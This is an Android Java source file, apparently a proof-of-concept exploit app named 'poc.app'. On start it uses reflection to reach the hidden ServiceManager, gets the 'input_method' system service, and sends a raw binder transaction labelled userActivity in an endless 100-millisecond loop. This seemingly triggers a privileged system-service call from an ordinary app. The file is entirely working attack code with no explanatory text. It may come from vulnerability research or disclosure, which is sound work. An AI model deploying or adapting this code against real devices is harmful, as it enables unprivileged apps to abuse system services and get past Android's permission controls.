package poc.app;

import android.app.Activity;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.SystemClock;

public class MainActivity extends Activity {
    static final int TRANSACTION_userActivity = 29;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        new Thread(() -> {
            try {
                IBinder binder = getService("input_method");
                while (true) {
                    Parcel parcel = Parcel.obtain();
                    parcel.writeInterfaceToken(binder.getInterfaceDescriptor());
                    parcel.writeLong(SystemClock.uptimeMillis());
                    parcel.writeInt(0);
                    parcel.writeInt(0);

                    Parcel reply = Parcel.obtain();
                    binder.transact(TRANSACTION_userActivity, parcel, reply, 0);
                    reply.readException();

                    Thread.sleep(100);
                }
            } catch (Throwable th) {
                throw new RuntimeException(th);
            }
        }).start();
    }

    private IBinder getService(String name) throws Throwable {
        return (IBinder) Class.forName("android.os.ServiceManager")
                .getDeclaredMethod("getServiceOrThrow", String.class)
                .invoke(null, name);
    }
}